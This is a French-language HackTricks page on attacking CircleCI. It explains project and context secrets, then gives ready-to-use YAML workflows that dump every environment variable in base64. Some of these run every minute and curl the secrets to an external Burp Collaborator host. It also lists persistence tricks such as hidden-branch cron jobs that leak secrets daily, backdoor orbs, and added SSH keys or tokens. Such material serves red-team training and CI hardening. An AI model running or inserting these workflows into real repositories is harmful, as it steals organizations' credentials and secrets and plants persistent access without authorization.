# CircleCI S√©curit√©

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Informations de base

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) est une plateforme d'int√©gration continue o√π vous pouvez **d√©finir des mod√®les** indiquant ce que vous voulez qu'elle fasse avec du code et quand le faire. De cette mani√®re, vous pouvez **automatiser les tests** ou **les d√©ploiements** directement **depuis la branche principale de votre d√©p√¥t**, par exemple.

### Permissions

**CircleCI** **h√©rite des permissions** de github et bitbucket li√©es au **compte** qui se connecte.\
Lors de mes tests, j'ai v√©rifi√© que tant que vous avez **des permissions d'√©criture sur le d√©p√¥t dans github**, vous pourrez **g√©rer les param√®tres de projet dans CircleCI** (d√©finir de nouvelles cl√©s ssh, obtenir des cl√©s api de projet, cr√©er de nouvelles branches avec de nouvelles configurations CircleCI...).

Cependant, vous devez √™tre un **administrateur de d√©p√¥t** pour **convertir le d√©p√¥t en projet CircleCI**.

### Variables d'environnement & Secrets

Selon [**la documentation**](https://circleci.com/docs/2.0/env-vars/), il existe diff√©rentes mani√®res de **charger des valeurs dans des variables d'environnement** √† l'int√©rieur d'un workflow.

#### Variables d'environnement int√©gr√©es

Chaque conteneur ex√©cut√© par CircleCI aura toujours [**des variables d'environnement sp√©cifiques d√©finies dans la documentation**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) comme `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` ou `CIRCLE_USERNAME`.

#### Texte clair

Vous pouvez les d√©clarer en texte clair √† l'int√©rieur d'une **commande**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Vous pouvez les d√©clarer en texte clair √† l'int√©rieur de l'**environnement d'ex√©cution** :
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Vous pouvez les d√©clarer en texte clair √† l'int√©rieur de l'**environnement de build-job** :
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Vous pouvez les d√©clarer en texte clair √† l'int√©rieur de **l'environnement d'un conteneur** :
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### Secrets de Projet

Ce sont des **secrets** qui ne seront **accessibles** que par le **projet** (par **n'importe quelle branche**).\
Vous pouvez les voir **d√©clar√©s dans** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
La fonctionnalit√© "**Import Variables**" permet d'**importer des variables d'autres projets** vers celui-ci.
{% endhint %}

#### Secrets de Contexte

Ce sont des secrets qui sont **√† l'√©chelle de l'organisation**. Par **d√©faut, n'importe quel repo** pourra **acc√©der √† n'importe quel secret** stock√© ici :

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Cependant, notez qu'un groupe diff√©rent (au lieu de Tous les membres) peut √™tre **s√©lectionn√© pour donner acc√®s aux secrets √† des personnes sp√©cifiques**.\
C'est actuellement l'un des meilleurs moyens d'**augmenter la s√©curit√© des secrets**, en ne permettant pas √† tout le monde d'y acc√©der mais seulement √† certaines personnes.
{% endhint %}

### Attaques

#### Recherche de Secrets en Texte Clair

Si vous avez **acc√®s au VCS** (comme github), v√©rifiez le fichier `.circleci/config.yml` de **chaque repo sur chaque branche** et **recherchez** des **secrets en texte clair** potentiels stock√©s l√†.

#### √ânum√©ration des Variables d'Environnement Secrets & Contextes

En v√©rifiant le code, vous pouvez trouver **tous les noms de secrets** qui sont **utilis√©s** dans chaque fichier `.circleci/config.yml`. Vous pouvez √©galement obtenir les **noms de contexte** √† partir de ces fichiers ou les v√©rifier dans la console web : _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

#### Exfiltrer les Secrets de Projet

{% hint style="warning" %}
Pour **exfiltrer TOUS** les **SECRETS** de projet et de contexte, vous **devez juste** avoir un acc√®s **√âCRIT** √† **juste 1 repo** dans toute l'organisation github (_et votre compte doit avoir acc√®s aux contextes mais par d√©faut tout le monde peut acc√©der √† chaque contexte_).
{% endhint %}

{% hint style="danger" %}
La fonctionnalit√© "**Import Variables**" permet d'**importer des variables d'autres projets** vers celui-ci. Par cons√©quent, un attaquant pourrait **importer toutes les variables de projet de tous les repos** et ensuite **exfiltrer toutes ensemble**.
{% endhint %}

Tous les secrets de projet sont toujours d√©finis dans l'environnement des jobs, donc il suffit d'appeler env et de l'obfusquer en base64 pour exfiltrer les secrets dans la **console de log web des workflows** :
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Si vous **n'avez pas acc√®s √† la console web** mais que vous avez **acc√®s au d√©p√¥t** et que vous savez que CircleCI est utilis√©, vous pouvez simplement **cr√©er un workflow** qui est **d√©clench√© toutes les minutes** et qui **exfiltre les secrets vers une adresse externe** :
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### Exfiltrer les secrets de contexte

Vous devez **sp√©cifier le nom du contexte** (cela exfiltrera √©galement les secrets du projet) :
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Si vous **n'avez pas acc√®s √† la console web** mais que vous avez **acc√®s au d√©p√¥t** et que vous savez que CircleCI est utilis√©, vous pouvez simplement **modifier un workflow** qui est **d√©clench√© toutes les minutes** et qui **exfiltre les secrets vers une adresse externe** :
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Cr√©er simplement un nouveau `.circleci/config.yml` dans un d√©p√¥t **ne suffit pas √† d√©clencher une build circleci**. Vous devez **l'activer en tant que projet dans la console circleci**.
{% endhint %}

#### √âvasion vers le Cloud

**CircleCI** vous offre la possibilit√© d'ex√©cuter **vos builds sur leurs machines ou sur les v√¥tres**.\
Par d√©faut, leurs machines sont situ√©es dans GCP, et vous ne pourrez initialement rien trouver de pertinent. Cependant, si une victime ex√©cute les t√¢ches sur **ses propres machines (potentiellement, dans un environnement cloud)**, vous pourriez trouver un **point de terminaison de m√©tadonn√©es cloud avec des informations int√©ressantes**.

Remarquez que dans les exemples pr√©c√©dents, tout a √©t√© lanc√© √† l'int√©rieur d'un conteneur docker, mais vous pouvez √©galement **demander √† lancer une machine VM** (qui peut avoir des autorisations cloud diff√©rentes) :
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Ou m√™me un conteneur docker avec acc√®s √† un service docker distant :
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### Persistance

* Il est possible de **cr√©er** des **tokens utilisateur dans CircleCI** pour acc√©der aux points de terminaison de l'API avec les acc√®s des utilisateurs.
* _https://app.circleci.com/settings/user/tokens_
* Il est possible de **cr√©er des tokens de projet** pour acc√©der au projet avec les permissions donn√©es au token.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Il est possible d'**ajouter des cl√©s SSH** aux projets.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Il est possible de **cr√©er un cron job dans une branche cach√©e** dans un projet inattendu qui **fuit** toutes les **variables d'environnement contextuelles** chaque jour.
* Ou m√™me de cr√©er dans une branche / modifier un job connu qui **fuit** tous les contextes et les **secrets des projets** chaque jour.
* Si vous √™tes propri√©taire d'un github, vous pouvez **autoriser des orbes non v√©rifi√©s** et en configurer un dans un job comme **porte d√©rob√©e**.
* Vous pouvez trouver une **vuln√©rabilit√© d'injection de commande** dans certaines t√¢ches et **injecter des commandes** via un **secret** en modifiant sa valeur.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
